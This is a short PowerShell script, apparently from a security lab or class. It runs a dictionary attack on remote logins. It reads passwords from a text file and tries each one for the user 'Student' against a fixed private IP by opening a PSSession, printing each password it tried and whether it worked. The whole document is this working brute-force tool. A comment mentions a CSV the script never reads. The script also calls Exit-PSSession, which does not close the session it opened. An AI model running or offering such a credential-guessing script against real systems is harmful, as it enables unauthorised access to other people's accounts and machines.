# Given a username and a txt of passwords, this script will attempt to log into a remote machine via Powershell.
# Each time it runs, it will print the password that it tried and whether it succeeded or failed.
# The script will then close the PSSession if it succeeded.

# Import the txt file with passwords
$passwords = Get-Content -Path "Powershell\passwords.txt"

# Define username
$username = "Student"
# Define IP address
#$ip = "172.16.2.223"
$ip = "172.16.2.77"

# Get the first set of credentials from the CSV file
foreach ($password in $passwords) {
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credentialObject = New-Object System.Management.Automation.PSCredential($username, $securePassword)
    # Try to start a new PSSession with the IP address and the credentials
    $session = New-PSSession -ComputerName $ip -Credential $credentialObject -ErrorAction SilentlyContinue

    if ($?) {
        Write-Host "New-PSSession succeeded"
        # Print the password and that it succeeded
        Write-Host "Suceeded: $password"
        Exit-PSSession
        break
    }
    else {
        Write-Host "New-PSSession failed"
        # Print the password and that it failed
        Write-Host "Failed: $password"
    }
}
